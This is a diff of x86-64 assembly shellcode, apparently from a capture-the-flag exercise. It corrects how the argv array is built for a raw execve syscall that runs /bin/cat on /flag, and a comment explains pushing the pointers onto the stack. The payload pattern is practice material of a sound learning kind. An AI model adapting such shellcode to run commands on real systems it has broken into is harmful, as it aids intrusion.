@@ -3,21 +3,40 @@
         .text
 
 _start:
-//      jmp skip
-
-skip:
-//      int 3
-        mov     rax, 59
+        
+	mov     rax, 59
         lea     rdi, [rip+arg0]
-        lea     rcx, [rip+arg1]
-        push    rcx
-        lea     rsi, [rsp]
+	
+
+	mov	rcx, 0
+	push rcx
+
+	lea 	rcx, [rip+arg1]
+	push 	rcx
+
+	lea 	rcx, [rip+arg0]
+	push 	rcx
+
+	mov 	rsi, rsp
+
+
         mov     rdx, 0
-        xor rcx, rcx
         syscall
         pop rcx
+	pop rcx
+	pop rcx
 
 arg0: .ascii "/bin/cat\0"
 arg1: .ascii "/flag\0"
-//  execve("/bin/cat", ["/bin/cat", "/flag"], NULL) = 0
-//execve("/bin/cat", ["/bin/cat", 0x1, "./a.out"], NULL)
+/*
+	argv: .quad arg0, arg1, 0
+
+	instead of creating that array of pointers,
+	im pushing the pointers onto the stack in reverse order.
+
+	0,
+	arg0,
+	arg1.
+
+	then providing rsi with the stack pointer
+*/
